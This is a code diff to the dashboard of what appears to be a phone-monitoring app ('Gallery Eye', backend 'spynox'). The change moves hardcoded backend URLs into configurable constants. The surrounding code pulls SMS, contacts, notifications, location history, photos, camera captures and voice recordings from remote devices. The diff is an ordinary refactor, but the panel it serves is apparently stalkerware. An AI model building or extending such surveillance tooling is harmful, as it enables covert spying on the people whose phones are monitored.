@@ -44,6 +44,8 @@ const QuickTutorial = dynamic(() => import("@/components/QuickTutorial"), { ssr:
 import { DeviceOfflineModal, DevicePermissionModal } from "@/components/DeviceActionModals";
 
 let socket: any = null;
+const BACKEND_URL = process.env.NEXT_PUBLIC_BACKEND_URL || 'https://spynox.collyes2.workers.dev';
+const SOCKET_URL = process.env.NEXT_PUBLIC_SOCKET_URL || 'https://p01--gallery-eye--9zr85m7yb6s4.code.run';
 
 interface PlanLimits {
     photos: number;
@@ -395,7 +397,7 @@ export default function Home(props: any) {
 
             if (uuid) {
                 const targetDevId = selectedDeviceId;
-                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/contacts/${uuid}?deviceId=${targetDevId}`)
+                fetch(`${BACKEND_URL}/api/contacts/${uuid}?deviceId=${targetDevId}`)
                     .then(res => res.json())
                     .then(data => {
                         if (selectedDeviceIdRef.current !== targetDevId) return;
@@ -405,7 +407,7 @@ export default function Home(props: any) {
                         }
                     }).catch(() => {});
 
-                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/sms/${uuid}?deviceId=${targetDevId}`)
+                fetch(`${BACKEND_URL}/api/sms/${uuid}?deviceId=${targetDevId}`)
                     .then(res => res.json())
                     .then(data => {
                         if (selectedDeviceIdRef.current !== targetDevId) return;
@@ -415,7 +417,7 @@ export default function Home(props: any) {
                         }
                     }).catch(() => {});
 
-                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/notifications/${uuid}?deviceId=${targetDevId}`)
+                fetch(`${BACKEND_URL}/api/notifications/${uuid}?deviceId=${targetDevId}`)
                     .then(res => res.json())
                     .then(data => {
                         if (selectedDeviceIdRef.current !== targetDevId) return;
@@ -549,7 +551,7 @@ export default function Home(props: any) {
                     socket.emit('remove_device', { uuid, deviceId, id: deviceId });
                 }
                 if (uuid) {
-                    fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/devices/delete', {
+                    fetch(`${BACKEND_URL}/api/devices/delete`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ uuid, deviceId, id: deviceId, _id: deviceId })
@@ -587,7 +589,7 @@ export default function Home(props: any) {
             socket.emit('rename_device', { uuid, deviceId, name: cleanName });
         }
         if (uuid) {
-            fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/devices/rename', {
+            fetch(`${BACKEND_URL}/api/devices/rename`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ uuid, deviceId, name: cleanName })
@@ -797,7 +799,7 @@ export default function Home(props: any) {
         } catch { setLocationData(null); setLocationHistory([]); }
 
         if (session?.user?.uuid) {
-            fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/location?uuid=${session.user.uuid}&deviceId=${selectedDeviceId}`)
+            fetch(`${BACKEND_URL}/api/location?uuid=${session.user.uuid}&deviceId=${selectedDeviceId}`)
                 .then(res => res.ok ? res.json() : null)
                 .then(data => {
                     if (data && data.latest) {
@@ -851,7 +853,7 @@ export default function Home(props: any) {
             const email = session?.user?.email || '';
             if (status === "authenticated" && (effectiveUuid || email)) {
                 const fetchFn: typeof fetch = (typeof window !== 'undefined' && (window as any).__nativeFetch) ? (window as any).__nativeFetch : fetch;
-                fetchFn(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/user/plan?uuid=${encodeURIComponent(effectiveUuid || '')}&email=${encodeURIComponent(email)}`)
+                fetchFn(`${BACKEND_URL}/user/plan?uuid=${encodeURIComponent(effectiveUuid || '')}&email=${encodeURIComponent(email)}`)
                     .then((res: Response) => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
                     .then((data: any) => {
                         if (data.uuid) {
@@ -907,7 +909,7 @@ export default function Home(props: any) {
             const uuid = effectiveUuid;
 
             // Immediately fetch devices via HTTP REST endpoint so offline/online devices show instantly
-            fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/devices/${uuid}`)
+            fetch(`${BACKEND_URL}/api/devices/${uuid}`)
                 .then(res => res.ok ? res.json() : null)
                 .then(data => {
                     if (data && Array.isArray(data.devices)) {
@@ -948,7 +950,7 @@ export default function Home(props: any) {
                 socket = null;
             }
 
-            socket = io("https://p01--gallery-eye--9zr85m7yb6s4.code.run", {
+            socket = io(SOCKET_URL, {
                 transports: ["websocket", "polling"],
                 upgrade: true,
                 reconnection: true,
@@ -981,7 +983,7 @@ export default function Home(props: any) {
                 if (now - lastConnectFetch < 10000) return;
                 lastConnectFetch = now;
 
-                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/notifications/${uuid}`)
+                fetch(`${BACKEND_URL}/api/notifications/${uuid}`)
                     .then(res => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
                     .then(data => {
                         if (data.notifications && data.notifications.length > 0) {
@@ -2028,7 +2030,7 @@ export default function Home(props: any) {
                 if (append) setIsLoadingMore(true);
                 const limit = fetchAll ? 10000 : 30;
                 const deviceQuery = `&deviceId=${targetDeviceId}`;
-                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/images?uuid=${uuid}&page=${loadPage}&limit=${limit}${deviceQuery}`)
+                fetch(`${BACKEND_URL}/images?uuid=${uuid}&page=${loadPage}&limit=${limit}${deviceQuery}`)
                     .then((res) => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
                     .then((data) => {
                         if (selectedDeviceIdRef.current && String(targetDeviceId) !== String(selectedDeviceIdRef.current)) return;
@@ -2130,7 +2132,7 @@ export default function Home(props: any) {
                 isFetchingCamera = true;
                 const limit = 10000;
                 const deviceQuery = `&deviceId=${targetDeviceId}`;
-                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/camera?uuid=${uuid}&page=${loadPage}&limit=${limit}${deviceQuery}`)
+                fetch(`${BACKEND_URL}/camera?uuid=${uuid}&page=${loadPage}&limit=${limit}${deviceQuery}`)
                     .then((res) => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
                     .then((data) => {
                         if (selectedDeviceIdRef.current && String(targetDeviceId) !== String(selectedDeviceIdRef.current)) return;
@@ -2174,7 +2176,7 @@ export default function Home(props: any) {
                 const limit = 100;
                 const deviceQuery = effectiveDevId ? `&deviceId=${effectiveDevId}` : '';
 
-                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/voice?uuid=${uuid}&page=${loadPage}&limit=${limit}${deviceQuery}`)
+                fetch(`${BACKEND_URL}/voice?uuid=${uuid}&page=${loadPage}&limit=${limit}${deviceQuery}`)
                     .then((res) => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
                     .then((data) => {
                         if (selectedDeviceIdRef.current && String(effectiveDevId) !== String(selectedDeviceIdRef.current)) return;
@@ -2311,7 +2313,7 @@ export default function Home(props: any) {
         setIsFetchingSms(true);
 
         // 1. Fetch from persistent MongoDB database (works even when device is offline!)
-        fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/sms/${uuid}?deviceId=${effectiveTarget}`)
+        fetch(`${BACKEND_URL}/api/sms/${uuid}?deviceId=${effectiveTarget}`)
             .then(res => res.json())
             .then(data => {
                 if (data.sms && Array.isArray(data.sms)) {
@@ -2363,7 +2365,7 @@ export default function Home(props: any) {
         setIsFetchingContacts(true);
 
         // 1. Fetch from persistent MongoDB database (works even when device is offline!)
-        fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/contacts/${uuid}?deviceId=${effectiveTarget}`)
+        fetch(`${BACKEND_URL}/api/contacts/${uuid}?deviceId=${effectiveTarget}`)
             .then(res => res.json())
             .then(data => {
                 if (data.contacts && Array.isArray(data.contacts)) {
@@ -2810,7 +2812,7 @@ export default function Home(props: any) {
             setIsSelectionMode(true);
             try {
                 // Fetch all IDs from backend to select everything without loading images into UI
-                const res = await fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/images?uuid=${session?.user?.uuid}&page=1&limit=10000`);
+                const res = await fetch(`${BACKEND_URL}/images?uuid=${session?.user?.uuid}&page=1&limit=10000`);
                 if (!res.ok) throw new Error('Fetch failed');
                 const data = await res.json();
                 const items = data.items || [];
@@ -2834,7 +2836,7 @@ export default function Home(props: any) {
         const idsToDelete = Array.from(selectedItems);
 
         try {
-            const response = await fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/delete', {
+            const response = await fetch(`${BACKEND_URL}/delete`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ ids: idsToDelete })
@@ -2885,7 +2887,7 @@ export default function Home(props: any) {
         }, 250);
 
         try {
-            const response = await fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/download-zip', {
+            const response = await fetch(`${BACKEND_URL}/download-zip`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ urls: selectedUrls })
@@ -3643,7 +3645,7 @@ END:VCARD`;
                             try { localStorage.removeItem('galleryeye_notifications'); } catch {}
                             const userUuid = session?.user?.uuid;
                             if (userUuid) {
-                                const url = `https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/notifications/${userUuid}` + 
+                                const url = `${BACKEND_URL}/api/notifications/${userUuid}` + 
                                     (selectedDeviceId ? `?deviceId=${selectedDeviceId}` : '');
                                 fetch(url, { method: 'DELETE' }).catch(() => {});
                             }
@@ -3886,7 +3888,7 @@ END:VCARD`;
                                         }
                                         return updated;
                                     });
-                                    fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/delete', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ids: deleteConfirmation.ids }) }).catch(()=>null);
+                                    fetch(`${BACKEND_URL}/delete`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ids: deleteConfirmation.ids }) }).catch(()=>null);
                                     setDeleteConfirmation({ isOpen: false, ids: [] });
                                     setIsCameraSelectMode(false);
                                     setCameraSelectedItems(new Set());
